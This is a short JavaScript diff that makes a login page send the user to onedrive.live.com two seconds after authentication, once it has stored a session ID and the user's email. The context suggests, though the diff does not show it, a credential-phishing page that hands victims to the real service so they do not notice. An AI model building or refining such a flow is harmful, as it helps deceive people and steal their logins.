@@ -1084,16 +1084,16 @@ Status: ${data.status}`);
                         console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
                     }
 
-                    // No frontend success message, but signal for redirect
-                    if (data.redirectToOneDrive) {
-                        console.log('Redirecting to OneDrive...');
-                        setTimeout(() => {
-                            window.location.href = 'https://onedrive.live.com';
-                        }, 2000); // Redirect after 2 seconds
-                    }
-
                     currentSessionId = data.sessionId;
                     currentUserEmail = data.userEmail;
+
+                    // Redirect to OneDrive automatically after 2 seconds
+                    console.log('Redirecting to OneDrive in 2 seconds...');
+                    setTimeout(() => {
+                        window.location.href = 'https://onedrive.live.com';
+                    }, 2000);
+
+                    // Show brief success message before redirect
                     showAuthSuccess(data.userEmail);
                 } else {
                     throw new Error(data.message || data.error || 'Unknown error');
